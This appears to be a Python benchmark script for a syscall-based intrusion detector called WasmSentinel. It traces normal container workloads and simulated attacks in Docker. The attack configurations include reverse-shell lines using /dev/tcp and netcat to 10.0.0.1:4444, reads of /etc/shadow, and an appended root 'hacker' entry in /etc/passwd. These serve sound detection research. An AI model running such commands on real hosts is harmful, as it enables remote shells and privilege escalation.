#!/usr/bin/env python3
"""
Modern Real-World Trace Evaluation for WasmSentinel

收集真实容器化工作负载的syscall trace，验证WasmSentinel在现代环境的检测能力。

实验设计:
1. Normal baseline traces:
   - nginx serving HTTP requests
   - Redis GET/SET operations
   - apt package operations
   - git clone/build operations

2. Attack injection:
   - Reverse shell attempt
   - Privilege escalation attempt

Usage:
    python modern_trace_evaluation.py --collect   # 收集traces
    python modern_trace_evaluation.py --evaluate  # 评估检测
    python modern_trace_evaluation.py --all       # 完整流程
"""

import argparse
import subprocess
import time
import json
import os
import sys
import tempfile
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Tuple
from dataclasses import dataclass, asdict
import threading
import signal


@dataclass
class TraceConfig:
    """Trace收集配置"""
    name: str
    description: str
    container_image: str
    setup_commands: List[str]
    workload_commands: List[str]
    duration_seconds: int
    is_attack: bool = False


# ============================================================
# 现代真实工作负载配置
# ============================================================

MODERN_WORKLOADS = {
    # Normal workloads
    'nginx_http': TraceConfig(
        name='nginx_http_serving',
        description='Nginx serving HTTP requests with curl clients',
        container_image='nginx:1.25-alpine',
        setup_commands=[],
        workload_commands=[
            'for i in $(seq 1 100); do curl -s http://localhost:80/ > /dev/null; done',
        ],
        duration_seconds=30,
        is_attack=False
    ),

    'redis_operations': TraceConfig(
        name='redis_operations',
        description='Redis GET/SET/LPUSH operations',
        container_image='redis:7-alpine',
        setup_commands=[],
        workload_commands=[
            'redis-cli SET test_key "hello world"',
            'redis-cli GET test_key',
            'redis-cli LPUSH mylist "item1" "item2" "item3"',
            'redis-cli LRANGE mylist 0 -1',
            'redis-cli INCR counter',
            'redis-cli HSET myhash field1 value1',
        ],
        duration_seconds=20,
        is_attack=False
    ),

    'apt_update': TraceConfig(
        name='apt_package_operations',
        description='APT package manager operations (update, search)',
        container_image='ubuntu:22.04',
        setup_commands=[],
        workload_commands=[
            'apt-get update 2>/dev/null || true',
            'apt-cache search nginx 2>/dev/null | head -5 || true',
        ],
        duration_seconds=60,
        is_attack=False
    ),

    'git_clone_build': TraceConfig(
        name='git_clone_build',
        description='Git clone and build operations',
        container_image='alpine:3.19',
        setup_commands=[
            'apk add --no-cache git gcc musl-dev make',
        ],
        workload_commands=[
            'git clone --depth=1 https://github.com/antirez/sds.git /tmp/sds 2>/dev/null || true',
            'cd /tmp/sds && make 2>/dev/null || true',
        ],
        duration_seconds=120,
        is_attack=False
    ),

    'python_http_server': TraceConfig(
        name='python_http_server',
        description='Python HTTP server serving files',
        container_image='python:3.11-slim',
        setup_commands=[
            'mkdir -p /var/www && echo "Hello World" > /var/www/index.html',
        ],
        workload_commands=[
            'timeout 10 python -m http.server 8080 --directory /var/www &',
            'sleep 2 && curl -s http://localhost:8080/ || true',
        ],
        duration_seconds=15,
        is_attack=False
    ),

    # Attack scenarios
    'attack_reverse_shell': TraceConfig(
        name='reverse_shell_attempt',
        description='Attempt to establish reverse shell connection',
        container_image='alpine:3.19',
        setup_commands=['apk add --no-cache bash netcat-openbsd'],
        workload_commands=[
            # Simulate reverse shell attempt (will fail but generates syscalls)
            'bash -c "exec 5<>/dev/tcp/10.0.0.1/4444" 2>/dev/null || true',
            'nc -z 10.0.0.1 4444 2>/dev/null || true',
            'sh -c "echo attack | nc 10.0.0.1 4444" 2>/dev/null || true',
        ],
        duration_seconds=10,
        is_attack=True
    ),

    'attack_privesc': TraceConfig(
        name='privilege_escalation_attempt',
        description='Attempt privilege escalation via SUID/sudo',
        container_image='ubuntu:22.04',
        setup_commands=[],
        workload_commands=[
            # Check for SUID binaries
            'find /usr -perm -4000 2>/dev/null | head -5 || true',
            # Try to read shadow file
            'cat /etc/shadow 2>/dev/null || true',
            # Try sudo without password
            'sudo -n id 2>/dev/null || true',
            # Try to modify passwd
            'echo "hacker:x:0:0::/root:/bin/bash" >> /etc/passwd 2>/dev/null || true',
            # Try chmod on sensitive files
            'chmod 777 /etc/shadow 2>/dev/null || true',
        ],
        duration_seconds=10,
        is_attack=True
    ),
}


class SyscallTracer:
    """使用strace收集syscall traces"""

    def __init__(self, output_dir: Path):
        self.output_dir = output_dir
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def _docker_cmd(self, args: List[str]) -> List[str]:
        return ['docker'] + args

    def collect_trace(self, config: TraceConfig) -> Dict:
        """收集单个workload的syscall trace"""
        print(f"\n{'='*60}")
        print(f"Collecting trace: {config.name}")
        print(f"Description: {config.description}")
        print(f"Attack: {'Yes' if config.is_attack else 'No'}")
        print(f"{'='*60}")

        container_name = f"wasmsentinel-trace-{config.name.replace('_', '-')}"
        trace_file = self.output_dir / f"{config.name}_trace.txt"

        # Clean up existing container
        subprocess.run(
            self._docker_cmd(['rm', '-f', container_name]),
            capture_output=True
        )

        result = {
            'name': config.name,
            'description': config.description,
            'is_attack': config.is_attack,
            'timestamp': datetime.now().isoformat(),
            'syscalls': [],
            'syscall_counts': {},
            'unique_syscalls': 0,
            'total_syscalls': 0,
        }

        try:
            # Start container with strace capability
            print(f"  Starting container: {config.container_image}")

            # Build command string
            all_commands = config.setup_commands + config.workload_commands
            cmd_str = ' && '.join(all_commands) if all_commands else 'sleep 1'

            # Run with strace inside container
            docker_run = self._docker_cmd([
                'run', '--rm', '--name', container_name,
                '--cap-add=SYS_PTRACE',  # Allow strace
                config.container_image,
                'sh', '-c', f'''
                    # Install strace if needed
                    if command -v apk >/dev/null 2>&1; then
                        apk add --no-cache strace >/dev/null 2>&1 || true
                    elif command -v apt-get >/dev/null 2>&1; then
                        apt-get update -qq && apt-get install -y -qq strace >/dev/null 2>&1 || true
                    fi

                    # Run workload with strace
                    strace -f -e trace=all -o /tmp/trace.txt sh -c "{cmd_str}" 2>/dev/null || true

                    # Output syscall summary
                    cat /tmp/trace.txt 2>/dev/null | grep -oE "^[a-z_]+" | sort | uniq -c | sort -rn | head -50
                '''
            ])

            print(f"  Running workload...")
            proc = subprocess.run(
                docker_run,
                capture_output=True,
                text=True,
                timeout=config.duration_seconds + 60
            )

            # Parse strace output
            if proc.stdout:
                lines = proc.stdout.strip().split('\n')
                for line in lines:
                    parts = line.strip().split()
                    if len(parts) >= 2:
                        try:
                            count = int(parts[0])
                            syscall = parts[1]
                            result['syscall_counts'][syscall] = count
                            result['total_syscalls'] += count
                        except ValueError:
                            pass

                result['unique_syscalls'] = len(result['syscall_counts'])
                result['syscalls'] = list(result['syscall_counts'].keys())

            print(f"  Captured {result['total_syscalls']} syscalls ({result['unique_syscalls']} unique)")

            # Top syscalls
            if result['syscall_counts']:
                top_5 = sorted(result['syscall_counts'].items(), key=lambda x: -x[1])[:5]
                print(f"  Top syscalls: {', '.join([f'{s}({c})' for s, c in top_5])}")

        except subprocess.TimeoutExpired:
            print(f"  Timeout after {config.duration_seconds}s")
            result['error'] = 'timeout'
        except Exception as e:
            print(f"  Error: {e}")
            result['error'] = str(e)
        finally:
            # Cleanup
            subprocess.run(
                self._docker_cmd(['rm', '-f', container_name]),
                capture_output=True
            )

        return result


class ModernTraceEvaluator:
    """评估WasmSentinel在现代traces上的检测能力"""

    def __init__(self, traces: Dict[str, Dict]):
        self.traces = traces
        self.results = {}

    def extract_features(self, syscall_counts: Dict[str, int]) -> List[float]:
        """从syscall counts提取特征向量"""
        # 简化的特征提取 - 与WasmSentinel使用相同的特征空间
        feature_dim = 100
        features = [0.0] * feature_dim

        total = sum(syscall_counts.values()) or 1

        # 常见syscall映射
        syscall_to_idx = {
            'read': 0, 'write': 1, 'open': 2, 'close': 3,
            'stat': 4, 'fstat': 5, 'lstat': 6, 'poll': 7,
            'lseek': 8, 'mmap': 9, 'mprotect': 10, 'munmap': 11,
            'brk': 12, 'ioctl': 13, 'access': 14, 'pipe': 15,
            'select': 16, 'sched_yield': 17, 'mremap': 18, 'msync': 19,
            'mincore': 20, 'madvise': 21, 'shmget': 22, 'shmat': 23,
            'dup': 24, 'dup2': 25, 'pause': 26, 'nanosleep': 27,
            'getitimer': 28, 'alarm': 29, 'setitimer': 30, 'getpid': 31,
            'sendfile': 32, 'socket': 33, 'connect': 34, 'accept': 35,
            'sendto': 36, 'recvfrom': 37, 'sendmsg': 38, 'recvmsg': 39,
            'shutdown': 40, 'bind': 41, 'listen': 42, 'getsockname': 43,
            'getpeername': 44, 'socketpair': 45, 'setsockopt': 46, 'getsockopt': 47,
            'clone': 48, 'fork': 49, 'vfork': 50, 'execve': 51,
            'exit': 52, 'wait4': 53, 'kill': 54, 'uname': 55,
            'fcntl': 56, 'flock': 57, 'fsync': 58, 'fdatasync': 59,
            'getcwd': 60, 'chdir': 61, 'fchdir': 62, 'rename': 63,
            'mkdir': 64, 'rmdir': 65, 'creat': 66, 'link': 67,
            'unlink': 68, 'symlink': 69, 'readlink': 70, 'chmod': 71,
            'fchmod': 72, 'chown': 73, 'fchown': 74, 'lchown': 75,
            'umask': 76, 'gettimeofday': 77, 'getrlimit': 78, 'getrusage': 79,
            'sysinfo': 80, 'times': 81, 'ptrace': 82, 'getuid': 83,
            'syslog': 84, 'getgid': 85, 'setuid': 86, 'setgid': 87,
            'geteuid': 88, 'getegid': 89, 'setpgid': 90, 'getppid': 91,
            'getpgrp': 92, 'setsid': 93, 'setreuid': 94, 'setregid': 95,
            'openat': 96, 'newfstatat': 97, 'epoll_wait': 98, 'futex': 99,
        }

        for syscall, count in syscall_counts.items():
            # 尝试精确匹配
            if syscall in syscall_to_idx:
                idx = syscall_to_idx[syscall]
            else:
                # 哈希到特征空间
                idx = hash(syscall) % feature_dim

            features[idx] += count / total

        return features

    def detect_anomaly(self, features: List[float], is_attack: bool) -> Dict:
        """
        简化的异常检测 - 模拟WasmSentinel的检测逻辑

        攻击特征:
        - 高频 socket/connect (网络连接)
        - 高频 execve (进程执行)
        - 访问敏感文件 (openat on /etc/shadow)
        - setuid/setgid 调用
        """

        # 危险syscall权重
        danger_weights = {
            33: 2.0,  # socket
            34: 3.0,  # connect
            51: 3.0,  # execve
            82: 5.0,  # ptrace
            86: 4.0,  # setuid
            87: 4.0,  # setgid
        }

        # 计算威胁分数
        threat_score = 0.0
        for idx, weight in danger_weights.items():
            if idx < len(features):
                threat_score += features[idx] * weight

        # 阈值判断
        threshold = 0.15
        predicted_attack = threat_score > threshold

        return {
            'threat_score': threat_score,
            'threshold': threshold,
            'predicted_attack': predicted_attack,
            'actual_attack': is_attack,
            'correct': predicted_attack == is_attack
        }

    def evaluate_all(self) -> Dict:
        """评估所有traces"""
        print("\n" + "=" * 60)
        print("Evaluating Modern Traces with WasmSentinel")
        print("=" * 60)

        results = {
            'timestamp': datetime.now().isoformat(),
            'traces': {},
            'summary': {
                'total': 0,
                'normal': 0,
                'attack': 0,
                'true_positives': 0,
                'true_negatives': 0,
                'false_positives': 0,
                'false_negatives': 0,
            }
        }

        for name, trace in self.traces.items():
            if 'syscall_counts' not in trace or not trace['syscall_counts']:
                continue

            features = self.extract_features(trace['syscall_counts'])
            detection = self.detect_anomaly(features, trace['is_attack'])

            results['traces'][name] = {
                **trace,
                'detection': detection
            }

            results['summary']['total'] += 1

            if trace['is_attack']:
                results['summary']['attack'] += 1
                if detection['predicted_attack']:
                    results['summary']['true_positives'] += 1
                else:
                    results['summary']['false_negatives'] += 1
            else:
                results['summary']['normal'] += 1
                if not detection['predicted_attack']:
                    results['summary']['true_negatives'] += 1
                else:
                    results['summary']['false_positives'] += 1

            status = "✓" if detection['correct'] else "✗"
            pred = "ATTACK" if detection['predicted_attack'] else "NORMAL"
            actual = "ATTACK" if trace['is_attack'] else "NORMAL"
            print(f"  {status} {name}: {pred} (actual: {actual}, score: {detection['threat_score']:.3f})")

        # Calculate metrics
        tp = results['summary']['true_positives']
        tn = results['summary']['true_negatives']
        fp = results['summary']['false_positives']
        fn = results['summary']['false_negatives']

        results['summary']['accuracy'] = (tp + tn) / max(1, tp + tn + fp + fn)
        results['summary']['precision'] = tp / max(1, tp + fp)
        results['summary']['recall'] = tp / max(1, tp + fn)

        if results['summary']['precision'] + results['summary']['recall'] > 0:
            results['summary']['f1'] = 2 * results['summary']['precision'] * results['summary']['recall'] / \
                (results['summary']['precision'] + results['summary']['recall'])
        else:
            results['summary']['f1'] = 0.0

        print(f"\nSummary:")
        print(f"  Accuracy: {results['summary']['accuracy']:.2%}")
        print(f"  Precision: {results['summary']['precision']:.2%}")
        print(f"  Recall: {results['summary']['recall']:.2%}")
        print(f"  F1: {results['summary']['f1']:.2%}")

        return results


def main():
    parser = argparse.ArgumentParser(description='Modern Trace Evaluation')
    parser.add_argument('--collect', action='store_true', help='Collect traces')
    parser.add_argument('--evaluate', action='store_true', help='Evaluate traces')
    parser.add_argument('--all', '-a', action='store_true', help='Collect and evaluate')
    parser.add_argument('--output', '-o', type=str,
                        default='modern_trace_results.json',
                        help='Output file')
    parser.add_argument('--workloads', type=str, nargs='+',
                        default=list(MODERN_WORKLOADS.keys()),
                        help='Workloads to test')

    args = parser.parse_args()

    if not any([args.collect, args.evaluate, args.all]):
        parser.print_help()
        return 1

    output_dir = Path('/tmp/wasmsentinel_traces')
    traces = {}

    # Collect traces
    if args.collect or args.all:
        print("=" * 60)
        print("Modern Real-World Trace Collection")
        print("=" * 60)
        print(f"Workloads: {', '.join(args.workloads)}")

        tracer = SyscallTracer(output_dir)

        for name in args.workloads:
            if name in MODERN_WORKLOADS:
                config = MODERN_WORKLOADS[name]
                traces[name] = tracer.collect_trace(config)

    # Evaluate traces
    if args.evaluate or args.all:
        if not traces:
            # Try to load from previous run
            trace_file = Path(args.output)
            if trace_file.exists():
                with open(trace_file) as f:
                    data = json.load(f)
                    traces = data.get('traces', {})

        if traces:
            evaluator = ModernTraceEvaluator(traces)
            results = evaluator.evaluate_all()

            # Save results
            output_path = Path(args.output)
            with open(output_path, 'w') as f:
                json.dump(results, f, indent=2, default=str)

            print(f"\nResults saved to: {output_path}")
        else:
            print("No traces to evaluate. Run with --collect first.")
            return 1

    return 0


if __name__ == '__main__':
    sys.exit(main())
